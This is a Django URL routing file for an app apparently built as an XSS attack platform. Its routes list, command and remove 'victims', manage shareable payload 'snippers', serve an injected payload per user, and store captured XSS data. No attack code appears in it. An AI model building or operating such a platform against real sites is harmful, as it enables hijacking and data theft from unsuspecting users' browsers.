from django.conf.urls import patterns, include, url

urlpatterns = patterns('app_xss_platform.views',
    url(r'^$', 'xss_index', name='xss-index'),
    url(r'^show/(?P<vid>\d+)$', 'show_victim', name='show-victim'),
    url(r'^command/(?P<vid>\d+)$', 'command_victim', name='command-victim'),
    url(r'^remove/(?P<vid>\d+)$', 'remove_victim', name='remove-victim'),
    url(r'^snippers/$', 'my_snippers', name='my-snippers'),
    url(r'^snippers/add/$', 'add_snipper', name='add-snipper'),
    url(r'^snippers/show/(?P<sid>\d+)$', 'show_snipper', name='show-snipper'),
    url(r'^snippers/payload/(?P<sid>\d+)$', 'add_snipper_to_payload', name='add-snipper-to-payload'),
    url(r'^snippers/remove/(?P<sid>\d+)$', 'remove_snipper', name='remove-snipper'),
    url(r'^snippers/public/$', 'show_public_snippers', name='show-public-snippers'),
    url(r'^u/(?P<uid>\d+)/i/', 'inject_payload', name="xss-payload"),
    url(r'^u/(?P<uid>\d+)/s/', 'store_xss_info', name="xss_store"),
    
)
